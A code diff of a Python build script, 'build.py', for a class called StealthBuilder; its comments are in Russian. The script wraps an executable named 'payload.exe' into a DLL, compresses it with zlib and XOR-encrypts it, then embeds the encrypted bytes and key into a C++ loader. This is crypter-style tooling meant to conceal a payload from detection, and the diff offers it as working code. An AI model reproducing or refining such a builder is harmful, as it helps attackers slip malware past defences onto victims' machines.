@@ -1,4 +1,4 @@
-# build.py - Сборка EXE с зашифрованной DLL (ИСПРАВЛЕННАЯ ВЕРСИЯ)
+# build.py - Сборка EXE с зашифрованной DLL (БИНАРНАЯ ВЕРСИЯ)
 import os
 import sys
 import subprocess
@@ -69,14 +69,12 @@ class StealthBuilder:
         return "payload.exe"
     
     def convert_exe_to_dll(self, exe_path):
-        """Конвертирует EXE в DLL (ПРАВИЛЬНЫЙ СИНТАКСИС)"""
+        """Конвертирует EXE в DLL"""
         print("[+] Converting EXE to DLL...")
         
-        # Читаем EXE
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
-        # Создаем DLL обертку на C с ПРАВИЛЬНЫМ синтаксисом массива
         dll_template = '''
 #include <windows.h>
 #include <stdio.h>
@@ -125,7 +123,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     return TRUE;
 }
 '''
-        # Конвертируем EXE в HEX строку с ПРАВИЛЬНЫМ синтаксисом
+        # Конвертируем EXE в HEX строку
         hex_parts = []
         for i, b in enumerate(exe_data):
             if i > 0 and i % 16 == 0:
@@ -134,15 +132,12 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         
         hex_string = ''.join(hex_parts).rstrip(', ')
         
-        # Заменяем плейсхолдеры
         dll_code = dll_template.replace('DATA', hex_string)
         dll_code = dll_code.replace('SIZE', str(len(exe_data)))
         
-        # Сохраняем DLL код
         with open('payload_dll.c', 'w', encoding='utf-8') as f:
             f.write(dll_code)
         
-        # Компилируем DLL через MinGW
         cmd = [
             'gcc', '-shared', '-o', 'payload.dll',
             'payload_dll.c',
@@ -167,10 +162,8 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         with open(dll_path, 'rb') as f:
             dll_data = f.read()
         
-        # Сжимаем
         compressed = zlib.compress(dll_data, level=9)
         
-        # XOR шифруем
         encrypted = bytearray(compressed)
         for i in range(len(encrypted)):
             encrypted[i] ^= self.xor_key[i % len(self.xor_key)]
@@ -192,30 +185,39 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         return result
     
     def build_loader(self, encrypted_dll):
-        """Собирает финальный загрузчик"""
+        """Собирает финальный загрузчик (БИНАРНЫЙ РЕЖИМ)"""
         print("[+] Building loader...")
         
-        with open('loader.cpp', 'r') as f:
-            loader = f.read()
+        # Читаем loader.cpp в БИНАРНОМ режиме
+        with open('loader.cpp', 'rb') as f:
+            loader = f.read().decode('utf-8', errors='ignore')
         
+        # Заменяем плейсхолдеры на C массивы
+        encrypted_array = self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
+        key_array = self.bytes_to_c_array(self.xor_key, 'xor_key')
+        dll_len_str = f'unsigned int dll_len = {len(encrypted_dll)};'
+        key_len_str = f'unsigned int key_len = {len(self.xor_key)};'
+        
+        # Встраиваем данные
         loader = loader.replace(
             'extern unsigned char encrypted_dll[];',
-            self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
+            encrypted_array
         )
         loader = loader.replace(
             'extern unsigned int dll_len;',
-            f'unsigned int dll_len = {len(encrypted_dll)};'
+            dll_len_str
         )
         loader = loader.replace(
             'extern unsigned char xor_key[];',
-            self.bytes_to_c_array(self.xor_key, 'xor_key')
+            key_array
         )
         loader = loader.replace(
             'extern unsigned int key_len;',
-            f'unsigned int key_len = {len(self.xor_key)};'
+            key_len_str
         )
         
-        with open('loader_final.cpp', 'w') as f:
+        # Сохраняем в БИНАРНОМ режиме
+        with open('loader_final.cpp', 'w', encoding='utf-8') as f:
             f.write(loader)
         
         print("[+] Loader ready!")
